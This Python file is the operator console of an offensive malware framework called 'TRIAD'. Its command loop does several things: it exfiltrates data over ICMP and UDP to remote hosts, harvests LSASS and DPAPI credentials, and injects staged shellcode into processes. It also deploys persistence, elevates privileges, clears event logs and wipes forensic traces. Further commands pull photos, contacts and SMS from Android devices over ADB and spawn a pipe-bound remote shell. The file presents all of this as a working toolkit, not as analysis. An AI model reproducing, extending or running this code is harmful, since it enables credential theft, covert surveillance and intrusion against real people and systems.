#!/usr/bin/env python3
"""
TRIAD Command Center - C3rb3rus-666 Edition
Architecture: Systemic Integration (VX + UIA)
"""
import socket
import sys
import asyncio
import os
import shlex
import time
import select
from pathlib import Path
import threading
import queue

# network helpers (may raise ImportError if module missing)
try:
    from core.network.receiver import start_receiver, list_loot
except ImportError:
    # fallback wrappers if the receiver module is unavailable
    def start_receiver():
        print(f"{R}[!] Warning: start_receiver not available{W}")
        return None
    def list_loot():
        return []

from engines.factory import EngineFactory
from engines.windows.vx_eng import TriadMemoryError
from tools.uia_mod import run_uia_mod
from core.bridge import EventType, TelemetryEvent, CommunicationBridge
from core.persistence.ubiquity import deploy_persistence
from core.exploits.omni_grabber import OmniGrabber
from core.network.shadow_pipe import start_tunnel
from core.security.eraser import clear_event_logs, deep_wipe
from core.network.outbound import icmp_exfil
from core.spy.eye import take_screenshot
from core.network.radar import auto_discover_network
from core.storage.manager import get_last_loot, get_all_loot
from core.security.elevator import auto_elevate
from core.execution.shell import spawn_pipe_shell
from core.storage.packer import LootPacker
import ctypes, msvcrt, os
from core.exploration.searcher import hunt
from core.network.radar import scan_target
from core.strategy import StrategyEngine

# store radar outputs keyed by target ip
radar_cache: dict = {}


# consolidate global state to reduce orphan variables
console_state = {
    "pid": None,
    "proc_name": None,
    "hproc": None,
    "tunnel": None,
    "last_target": None,  # store last radar/discover IP
    "discovered_targets": [],  # list of {'ip','hostname','os','status'}
    "active_sessions": {},  # reassembly/other session tracking
    "loot_queue": [],
}

R = "\033[31m"   
G = "\033[90m"   
W = "\033[0m"    
B = "\033[1m"    

BANNER = f"""{R}

 ░▒▓████████▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓██████▓▒░░▒▓███████▓▒░  
 ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓█▓▒░   ░▒▓███████▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░ 
 ░▒▓█▓▒░   ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓███████▓▒░{W}
github.com/C3rb3rus-666 | @t.me/c3rb3rus_666
"""

STAMP = f"""{G}┌──────────────────────────────────────────────────────────┐
│ {W}{B}SYSTEM ARCHITECT:{R} Carlos Sanchez | C3rb3rus-666{G}         │
│ {W}{B}FRAMEWORK:       {R}TRIAD Engine v26.3{G}                    │
│ {W}{B}STATUS:          {R}OPERATIONAL // DOMINANCE{G}              │
└──────────────────────────────────────────────────────────┘{W}"""


# console_state initialized at top of module with expanded keys

# uptime tracking
start_time = time.time()

engine = EngineFactory.get_engine()
msg_bus = CommunicationBridge()



def find_target(name: str):
    async def _inner():
        procs = await engine.enumerate_processes()
        for pid in procs:
            n = await engine.get_process_name(pid)
            if n and name.lower() in n.lower():
                # store name obfuscated on heap
                return pid, engine.obfuscate(n)
        return None, None
    return asyncio.run(_inner())


def resolve_target(arg: str) -> str:
    """Return an IP corresponding to either a raw address or a discovery ID."""
    global console_state
    if arg.isdigit():
        idx = int(arg) - 1
        dlist = console_state.get('discovered_targets', [])
        if 0 <= idx < len(dlist):
            return dlist[idx].get('ip')
    return arg


def _beacon_listener():
    """Thread that sniffs UDP packets for covert beacons."""
    try:
        raw = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    except PermissionError:
        print(f"{R}[!] Error: Se requieren privilegios de Root para abrir Raw Sockets de ICMP{W}")
        return
    except Exception:
        return
    while True:
        try:
            pkt, addr = raw.recvfrom(4096)
            if b"NOTIFY * HTTP/1.1" in pkt:
                # parse headers to find USN
                try:
                    headers = pkt.split(b"\r\n")
                    usn_line = next((h for h in headers if h.lower().startswith(b"usn:")), None)
                    if not usn_line:
                        continue
                    usn_val = usn_line.split(b":", 1)[1].strip().decode(errors="ignore")
                    if usn_val.startswith("uuid:upnp-RootDevice-"):
                        enc = usn_val.split("-", 3)[-1]
                        # decode rotated base64
                        from core.network.beacon import _rotate_b64_inverse
                        try:
                            decbytes = _rotate_b64_inverse(enc)
                            text = decbytes.decode("utf-8")
                            botid, ip = text.split("|", 1)
                            print(f"{G}[Beacon]{W} {botid}@{ip} from {addr[0]}")
                        except Exception:
                            continue
                except Exception:
                    continue
        except Exception:
            continue


def _presence_pulse():
    """Background heartbeat/presence thread placeholder."""
    while True:
        # this could update console_state['active_sessions'] or similar
        time.sleep(60)


def do_scan(pattern: str):
    global console_state
    pid = console_state.get("pid")
    if not pid:
        print(f"{R}[!] Error: No target set. Use 'target <name>'.{W}")
        return
    try:
        hproc = asyncio.run(engine.open_process(pid))
        pat = pattern.encode("utf-8")
        # En el motor vx_eng, srch_rpl requiere (handle, search_bytes, replace_bytes)
        addr, regions = asyncio.run(engine.srch_rpl(hproc, pat, pat))
        print(f"{G}[+]{W} Pattern found @ {R}{hex(addr)}{W} (Regions scanned: {regions})")
    except TriadMemoryError as e:
        print(f"{R}[!] Scan failed:{W} {e}")
    except Exception as e:
        print(f"{R}[!] Unexpected error:{W} {e}")

def do_ghost(old: str, new: str):
    global console_state
    proc = console_state.get("proc_name")
    if not proc:
        print(f"{R}[!] Error: Target process name missing.{W}")
        return
    real_proc = engine.deobfuscate(proc)
    print(f"{G}[*] Invoking UIA Ghosting on {W}{real_proc}...")
    success = run_uia_mod(proc, old, new)
    status = f"{R}SUCCESS{W}" if success else f"{G}FAILED{W}"
    print(f"{G}[+]{W} Ghost operation: {status}")

def show_logs():
    path = Path(__file__).resolve().parent / ".triad_history"
    if not path.exists():
        print(f"{G}[*] No telemetry history found.{W}")
        return
    print(f"{G}--- TELEMETRY LOGS ---{W}")
    with path.open("r", encoding="utf-8") as f:
        for line in f:
            print(f"{G} > {W}{line.strip()}")

def repl():
    global console_state
    os.system('cls' if os.name == 'nt' else 'clear')
    print(BANNER)
    print(STAMP)

    # named pipe configuration (obfuscated on heap when idle)
    _raw_pipe = r"\\.\pipe\triad_ops"
    # use engine obfuscator
    pipe_name_enc = engine.obfuscate(_raw_pipe)
    cmd_queue: "queue.Queue[str]" = queue.Queue()
    adb_engine = None

    def pipe_thread():
        # simple abstraction: on Windows use named pipes, on Unix use a unix domain
        # socket in /tmp.
        if os.name == 'nt':
            import ctypes
            PIPE_ACCESS_DUPLEX = 0x00000003
            PIPE_TYPE_MESSAGE = 0x00000004
            PIPE_READMODE_MESSAGE = 0x00000002
            PIPE_WAIT = 0x00000000
            BUFFER_SIZE = 0x1000
            ERROR_PIPE_CONNECTED = 535
            INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value

            k32 = ctypes.windll.kernel32
            CreateNamedPipeW = k32.CreateNamedPipeW
            ConnectNamedPipe = k32.ConnectNamedPipe
            ReadFile = k32.ReadFile
            DisconnectNamedPipe = k32.DisconnectNamedPipe
            CloseHandle = k32.CloseHandle
            GetLastError = k32.GetLastError

            # define signatures for stability
            CreateNamedPipeW.argtypes = [
                ctypes.c_wchar_p,
                ctypes.c_uint32,
                ctypes.c_uint32,
                ctypes.c_uint32,
                ctypes.c_uint32,
                ctypes.c_uint32,
                ctypes.c_uint32,
                ctypes.c_void_p,
            ]
            CreateNamedPipeW.restype = ctypes.c_void_p
            ConnectNamedPipe.argtypes = [ctypes.c_void_p, ctypes.c_void_p]
            ConnectNamedPipe.restype = ctypes.c_bool
            ReadFile.argtypes = [
                ctypes.c_void_p,
                ctypes.c_void_p,
                ctypes.c_uint32,
                ctypes.POINTER(ctypes.c_uint32),
                ctypes.c_void_p,
            ]
            ReadFile.restype = ctypes.c_bool
            DisconnectNamedPipe.argtypes = [ctypes.c_void_p]
            DisconnectNamedPipe.restype = ctypes.c_bool
            CloseHandle.argtypes = [ctypes.c_void_p]
            CloseHandle.restype = ctypes.c_bool
            GetLastError.restype = ctypes.c_uint32

            pipe_name = engine.deobfuscate(pipe_name_enc)
            while True:
                hpipe = CreateNamedPipeW(
                    pipe_name,
                    PIPE_ACCESS_DUPLEX,
                    PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
                    1,
                    BUFFER_SIZE,
                    BUFFER_SIZE,
                    0,
                    None,
                )
                if hpipe == INVALID_HANDLE_VALUE:
                    print(f"{R}[!] Failed to create named pipe {pipe_name}{W}")
                    time.sleep(1)
                    continue

                text_buf = ""
                try:
                    connected = ConnectNamedPipe(hpipe, None)
                    if not connected:
                        err = GetLastError()
                        if err != ERROR_PIPE_CONNECTED:
                            time.sleep(0.1)
                            continue

                    while True:
                        buf = ctypes.create_string_buffer(BUFFER_SIZE)
                        read = ctypes.c_uint32(0)
                        ok = ReadFile(hpipe, buf, BUFFER_SIZE, ctypes.byref(read), None)
                        if not ok or read.value == 0:
                            break
                        chunk = buf.raw[: read.value]
                        text_buf += chunk.decode("utf-8", errors="ignore")
                        while "\n" in text_buf:
                            line, text_buf = text_buf.split("\n", 1)
                            line = line.rstrip("\r").strip()
                            if line:
                                cmd_queue.put(line)

                    leftover = text_buf.strip()
                    if leftover:
                        cmd_queue.put(leftover)
                finally:
                    DisconnectNamedPipe(hpipe)
                    CloseHandle(hpipe)
        else:
            # use AF_UNIX socket
            sock_path = "/tmp/triad_ops.sock"
            try:
                os.unlink(sock_path)
            except Exception:
                pass
            s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
            s.bind(sock_path)
            s.listen(1)
            conn, _ = s.accept()
            with conn.makefile("r") as f:
                for line in f:
                    cmd_queue.put(line.strip())
            conn.close()
            s.close()

    thr = threading.Thread(target=pipe_thread, daemon=True)
    thr.start()
    # other background threads are initialized in main()
    # start UDP/ICMP receiver also handled by main()
    # decode again for user output
    try:
        display_pipe = engine.deobfuscate(pipe_name_enc)
    except Exception:
        display_pipe = "<unknown>"
    print(f"{G}[*]{W} Listening for commands on named pipe: {display_pipe}")

    while True:
        try:
            # first check if a pipe command is waiting
            try:
                cmd_input = cmd_queue.get_nowait()
            except queue.Empty:
                # if not, fall back to interactive prompt
                cmd_input = input(f"{G}triad_ops > {W}").strip()
        except KeyboardInterrupt:
            print(f"\n{G}[*] Terminating session...{W}")
            break

        # before reading command, optionally display any active reassembly progress
        # compute simple progress of first incomplete session
        with threading.Lock():
            from core.network.state import sessions
            for (bot,fileid),sess in sessions.items():
                if not sess.get('complete'):
                    total = max(sess['fragments'].keys())+1 if sess['fragments'] else 0
                    got = len(sess['fragments'])
                    ch = sess.get('channel','?')
                    print(f"{G}[Receiving: {int((got/total*100) if total else 0)}% - Bot:{bot} - File:{fileid} - Chan:{ch}]{W}")
                    break
        if not cmd_input:
            continue

        try:
            parts = shlex.split(cmd_input)
        except ValueError as e:
            print(f"{R}[!] Syntax error:{W} {e}")
            continue

        cmd = parts[0].lower()

        if cmd in ["exit", "quit"]:
            # ask operator if a wipe is desired when closing
            if console_state.get("discovered_targets") or console_state.get("last_target"):
                ans = input(f"{R}[?]{W} Execute deep wipe before exit? (y/N) ").strip().lower()
                if ans.startswith("y"):
                    print(f"{G}[*]{W} Running cleanup...")
                    deep_wipe(True)
                    print(f"{G}[+]{W} Wipe complete")
            break

        elif cmd == "target" and len(parts) >= 2:
            name = " ".join(parts[1:])
            pid, pname = find_target(name)
            if pid:
                console_state["pid"] = pid
                console_state["proc_name"] = pname
                print(f"{G}[+]{W} Target locked: {R}{engine.deobfuscate(pname)}{W} (PID: {pid})")
            else:
                print(f"{R}[!] No process found matching '{name}'{W}")

        elif cmd == "scan" and len(parts) >= 2:
            do_scan(parts[1])

        elif cmd == "icmp" and len(parts) >= 5:
            # usage: icmp <dest> <botid> <fileid> <message...>
            dest = parts[1]
            bot = parts[2]
            fid = parts[3]
            data = " ".join(parts[4:]).encode("utf-8")
            try:
                icmp_exfil(dest, data, bot, fid)
                print(f"{G}[+]{W} Sent ICMP exfil to {dest} (bot={bot} file={fid})")
            except Exception as e:
                print(f"{R}[!] ICMP send failed: {e}{W}")

        elif cmd == "udp" and len(parts) >= 5:
            # usage: udp <dest> <port> <botid> <fileid> <message...>
            dest = parts[1]
            port = int(parts[2])
            bot = parts[3]
            fid = parts[4]
            data = " ".join(parts[5:]).encode("utf-8")
            try:
                from core.network.outbound import udp_exfil
                udp_exfil(dest, data, bot, fid, port=port)
                print(f"{G}[+]{W} Sent UDP exfil to {dest}:{port} (bot={bot} file={fid})")
            except Exception as e:
                print(f"{R}[!] UDP send failed: {e}{W}")

        elif cmd == "ghost" and len(parts) >= 3:
            do_ghost(parts[1], parts[2])

        elif cmd == "ghostpeb" and len(parts) >= 3:
            # direct engine PEB manipulation
            try:
                engine.mask_peb(parts[1], parts[2])
                print(f"{G}[+]{W} PEB fields rewritten")
            except Exception as e:
                print(f"{R}[!] PEB mask failed:{W} {e}")

        elif cmd == "discover":
            print(f"{G}[*]{W} Performing network discovery...")
            # perform reconnaissance
            hosts = auto_discover_network()
            # update global state
            console_state.setdefault('discovered_targets', []).clear()
            console_state['discovered_targets'].extend(hosts)
            # print table
            print(f"{G}[ID]   IP                 Hostname            OS              Status{W}")
            for idx, h in enumerate(console_state['discovered_targets'], start=1):
                ip = h.get('ip','')
                hn = h.get('hostname','')[:18]
                osstr = h.get('os','')
                stat = h.get('status','')
                print(f"{G}{idx:<3}{W}   {ip:<17} {hn:<18} {osstr:<15} {stat}")
        elif cmd == "radar" and len(parts) >= 2:
            arg = resolve_target(parts[1])
            target_ip = arg
            console_state["last_target"] = target_ip
            print(f"{G}[*]{W} Scanning {target_ip}...")
            radar_data = scan_target(target_ip)
            radar_cache[target_ip] = radar_data
            if not radar_data.get("ports"):
                print(f"{R}[!] No open ports detected or host unreachable.{W}")
            else:
                print(f"{G}[+] OS fingerprint: {radar_data.get('os')}{W}")
                for port, info in radar_data.get("ports", {}).items():
                    print(f"{G}[+] Port {port} open{W}")
                    if info.get("banner"):
                        print(f"    banner: {info['banner']}")
                    if info.get("vulns"):
                        for v in info["vulns"]:
                            print(f"    {R}vuln:{W} {v}")

        elif cmd == "suggest" and len(parts) >= 2:
            arg = resolve_target(parts[1])
            radar_data = radar_cache.get(arg)
            if not radar_data:
                print(f"{R}[!] No scan data for {arg}. Run radar first.{W}")
            else:
                strat = StrategyEngine()
                choice = strat.suggest(radar_data)
                if choice:
                    print(f"{G}[+] Suggested exploit: {R}{choice}{W}")
                else:
                    print(f"{R}[?]{W} No suitable exploit found.")

        elif cmd == "attack" and len(parts) >= 2:
            arg = resolve_target(parts[1])
            target_ip = arg
            module = parts[2] if len(parts) >= 3 else None
            if not module:
                radar_data = radar_cache.get(target_ip)
                if radar_data:
                    module = StrategyEngine().suggest(radar_data)
            if not module:
                print(f"{R}[!] No exploit specified or suggested.{W}")
            else:
                print(f"{G}[*]{W} Executing exploit '{module}' against {target_ip}...")
                # demonstration: build a staged payload and attempt injection
                try:
                    sample = b"TRIAD_STAGER" + module.encode("utf-8")
                    staged = engine.build_staged_payload(sample)
                    pid = console_state.get("pid")
                    if pid:
                        print(f"{G}[*]{W} Injecting into PID {pid} using staged shellcode ({len(staged)} bytes)")
                        result = asyncio.run(engine.inject_memory(pid, staged))
                        print(f"{G}[+]{W} Injection result: {result}")
                    else:
                        print(f"{G}[?]{W} No process handle available; skipping actual injection.")
                except Exception as e:
                    print(f"{R}[!] Attack execution failed:{W} {e}")

        elif cmd == "persist":
            try:
                deploy_persistence()
                print(f"{G}[+]{W} Persistence mechanism deployed")
            except Exception as e:
                print(f"{R}[!] Persistence failed:{W} {e}")

        elif cmd == "android":
            if len(parts) < 2:
                print(f"{R}[!] Usage:{W} android <connect|shell|grab> [args]")
                continue
            sub = parts[1].lower()
            if adb_engine is None:
                try:
                    from engines.android.adb_eng import AdbEngine
                    adb_engine = AdbEngine()
                except Exception as e:
                    print(f"{R}[!] Android engine unavailable:{W} {e}")
                    continue
            try:
                if sub == "connect":
                    if len(parts) < 3:
                        print(f"{R}[!] Usage:{W} android connect <ip>")
                        continue
                    ip = parts[2]
                    res = adb_engine.connect_target(ip)
                    msg = res.get("stdout") or res.get("stderr") or ""
                    if res.get("ok"):
                        print(f"{G}[+]{W} ADB connected: {ip} {msg}")
                    else:
                        print(f"{R}[!] ADB connect failed:{W} {msg}")
                elif sub == "shell":
                    adb_engine.open_shell()
                elif sub == "grab":
                    ts = int(time.time())
                    out_root = os.path.join("loot", "android", str(ts))
                    os.makedirs(out_root, exist_ok=True)

                    photos_dir = os.path.join(out_root, "photos")
                    os.makedirs(photos_dir, exist_ok=True)
                    pull_res = adb_engine.pull_path("/sdcard/DCIM", photos_dir)
                    if pull_res.get("ok"):
                        print(f"{G}[+]{W} Photos pulled to {photos_dir}")
                    else:
                        msg = pull_res.get("stdout") or pull_res.get("stderr") or ""
                        print(f"{R}[!] Photo pull failed:{W} {msg}")

                    contacts = adb_engine.dump_contacts()
                    contacts_path = os.path.join(out_root, "contacts.txt")
                    with open(contacts_path, "w", encoding="utf-8", errors="ignore") as f:
                        f.write(contacts)
                    print(f"{G}[+]{W} Contacts saved to {contacts_path}")

                    sms = adb_engine.dump_sms()
                    sms_path = os.path.join(out_root, "sms.txt")
                    with open(sms_path, "w", encoding="utf-8", errors="ignore") as f:
                        f.write(sms)
                    print(f"{G}[+]{W} SMS saved to {sms_path}")
                else:
                    print(f"{R}[!] Unknown android subcommand:{W} {sub}")
            except FileNotFoundError as e:
                print(f"{R}[!] ADB not found:{W} {e}")
            except Exception as e:
                print(f"{R}[!] Android command failed:{W} {e}")

        elif cmd == "grab":
            try:
                grabber = OmniGrabber()
                creds = grabber.read_lsass()
                dp = grabber.extract_dpapi()
                print(f"{G}[+]{W} LSASS data: {creds}")
                print(f"{G}[+]{W} DPAPI extras: {dp}")
            except Exception as e:
                print(f"{R}[!] Credential harvesting failed:{W} {e}")

        elif cmd == "tunnel" and len(parts) >= 4:
            lport = int(parts[1]); rh = parts[2]; rp = int(parts[3])
            listener = start_tunnel(lport, rh, rp)
            console_state["tunnel"] = listener
            print(f"{G}[+]{W} Tunnel listening on {lport} -> {rh}:{rp}")

        elif cmd == "erase":
            try:
                clear_event_logs()
                print(f"{G}[+]{W} Event logs cleared")
            except Exception as e:
                print(f"{R}[!] Log erasure failed:{W} {e}")

        elif cmd == "screenshot":
            try:
                open_flag = False
                if "--open" in parts:
                    open_flag = True
                data = take_screenshot()
                # send via pipe
                pipe = engine.deobfuscate(pipe_name_enc)
                h = ctypes.windll.kernel32.CreateFileW(pipe, 0x40000000, 0, None, 3, 0, None)
                if h != ctypes.c_void_p(-1).value:
                    fd = msvcrt.open_osfhandle(h, os.O_WRONLY)
                    with os.fdopen(fd, "wb", closefd=True) as f:
                        f.write(data)
                    print(f"{G}[+]{W} Screenshot sent ({len(data)} bytes)")
                else:
                    print(f"{R}[!] Failed to open pipe for screenshot{W}")
                    # fallback: use last_target to exfil via ICMP
                    dest = console_state.get("last_target") or "127.0.0.1"
                    try:
                        bot = console_state.get("bot_id", "CONSOLE")
                        fid = f"screenshot_{int(time.time())}"
                        icmp_exfil(dest, data, bot, fid)
                        print(f"{G}[+]{W} Screenshot exfiltrated via ICMP to {dest} (bot={bot}, file={fid})")
                    except Exception:
                        pass
                if open_flag:
                    last = get_last_loot()
                    if last and os.path.exists(last):
                        # before opening, pack the screenshot into loot
                        packer = LootPacker()
                        pkg = packer.save([last])
                        print(f"{G}[+] Screenshot packed as {pkg}{W}")
                        os.startfile(last)
            except Exception as e:
                print(f"{R}[!] Screenshot failed:{W} {e}")

        elif cmd == "getloot":
            loot = get_last_loot()
            if loot:
                print(f"{G}[+]{W} Last loot: {loot}")
            else:
                print(f"{R}[!] No loot recorded yet.{W}")

        elif cmd == "wipe":
            # perform full anti-forensic clean
            remove_wmi = "--nowmi" not in parts
            print(f"{G}[*]{W} Executing deep wipe (remove_wmi={remove_wmi})...")
            deep_wipe(remove_wmi)
            print(f"{G}[+]{W} System sanitized")

        elif cmd == "loot" and len(parts) >= 2:
            if parts[1] == "--list":
                items = list_loot()
                if not items:
                    print(f"{R}[!] No reconstructed loot available.{W}")
                else:
                    for it in items:
                        if it.get('status') == 'OK':
                            ch = it.get('channel','?')
                            print(f"{G}[+]{W} {it['path']} (crc:{it['crc']:08x}, chan:{ch})")
                        else:
                            print(f"{G}[~]{W} session {it['bot']}:{it['fileid']} incomplete (chan:{it.get('channel','?')})")
            elif parts[1] == "--clear":
                from core.network.receiver import clear_sessions
                clear_sessions()
                print(f"{G}[+]{W} Receiver sessions cleared")

        elif cmd == "pack":
            # gather all known loot paths and pack them
            from core.storage.manager import get_all_loot
            loot_list = get_all_loot()
            if not loot_list:
                print(f"{R}[!] No loot to pack.{W}")
            else:
                packer = LootPacker()
                pkg = packer.save(loot_list)
                # telemetry event
                asyncio.run(msg_bus.publish_event(
                    EventType.PAYLOAD_EXECUTED,
                    "local",
                    {"action": "pack", "files": len(loot_list)},
                    "triad_console",
                ))
                print(f"{G}[+]{W} Packaged {len(loot_list)} items into {pkg}")

        elif cmd == "hunt":
            # ignore optional numeric target id, just for compatibility
            if len(parts) >= 2 and parts[1].isdigit():
                parts.pop(1)
            exts = None
            content_kw = None
            # parse optional flags
            if "--content" in parts:
                idx = parts.index("--content")
                if idx + 1 < len(parts):
                    content_kw = parts[idx + 1]
            if len(parts) >= 2 and not parts[1].startswith("--"):
                exts = [e.strip() if e.strip().startswith('.') else '.'+e.strip() for e in parts[1].split(',')]
            print(f"{G}[*]{W} Hunting files...")
            results = hunt(exts, content_kw)
            if not results:
                print(f"{R}[!] No files found.{W}")
            else:
                for item in results[:20]:
                    mtime = time.strftime('%Y-%m-%d %H:%M:%S', time.localtime(item['mtime']))
                    extra = ' [match]' if item.get('match') else ''
                    print(f"{G}[+]{W} {item['path']} ({item['size']} bytes, {mtime}){extra}")

        elif cmd == "status":
            # uptime
            upt = time.time() - start_time
            hrs = int(upt // 3600)
            mins = int((upt % 3600) // 60)
            # priv
            try:
                is_admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
            except Exception:
                is_admin = False
            loot_count = len(getattr(__import__('core.storage.manager', fromlist=['_loot_list']), '_loot_list'))
            tunnel_state = "active" if console_state.get("tunnel") else "none"
            print(f"{G}[*]{W} Uptime: {hrs}h{mins}m | Privilege: {R}{'ADMIN' if is_admin else 'USER'}{W} | Loot items: {loot_count} | Tunnel: {tunnel_state}")

        elif cmd == "elevate":
            try:
                ok = auto_elevate()
                status = "started" if ok else "failed"
                print(f"{G}[+]{W} Elevation {status}")
            except Exception as e:
                print(f"{R}[!] Elevation error:{W} {e}")

        elif cmd == "interact":
            try:
                pipe = engine.deobfuscate(pipe_name_enc)
                spawn_pipe_shell(pipe)
                print(f"{G}[+]{W} Interactive ghost shell spawned")
            except Exception as e:
                print(f"{R}[!] Interactive shell failed:{W} {e}")

        elif cmd == "help":
            help_text = f"""
{B}Available Commands:{W}
  {R}target <name>{W}  - Lock process by name or PID
  {R}scan <text>{W}    - Search pattern in memory
  {R}ghost "A" "B"{W}  - UI-level replacement (Old -> New)
  {R}ghostpeb <cmd> <img>{W} - PEB mask (cmdline, image path)
  {R}radar <ip>{W}         - Port scan & vuln enumeration
  {R}suggest <ip>{W}      - Recommend exploit based on last scan
  {R}attack <ip/id> [mod]{W} - Launch exploit (auto-select if module omitted)
  {R}discover{W}         - Auto‑scan local subnet and list live hosts
  {R}wipe [--nowmi]{W}     - Perform anti-forensic cleanup (use --nowmi to keep WMI rules)
  {R}persist{W}         - Deploy persistence for current OS
  {R}android connect <ip>{W} - Link to wireless ADB target
  {R}android shell{W}   - Open remote device shell
  {R}android grab{W}    - Pull photos, contacts, and SMS
  {R}grab{W}            - Harvest credentials from local lsass
  {R}screenshot [--open]{W} - Capture screen and send encrypted via pipe, optionally open
  {R}getloot{W}        - Show path of last stored loot file
  {R}elevate{W}         - Attempt auto-elevation to high integrity
  {R}interact{W}       - Spawn ghost cmd.exe bound to TRIAD pipe
  {R}hunt [ext1,ext2]{W} - Recursively search user folders for sensitive files
                             (use --content <keyword> to filter text files)
  {R}pack{W}            - Consolidate all loot into one encrypted package
  {R}status{W}          - Quick dashboard (uptime, privs, loot count, tunnel)
  {R}tunnel <lport> <rhost> <rport>{W} - Start pipe-based port forwarder
  {R}erase{W}           - Clear Security/System event logs
  {R}logs{W}           - Show communication bridge history
  {R}exit{W}           - Close TRIAD
            """
            print(help_text)
        else:
            print(f"{G}[?]{W} Unknown command. Type {R}'help'{W} for list.")

if __name__ == "__main__":
    repl()
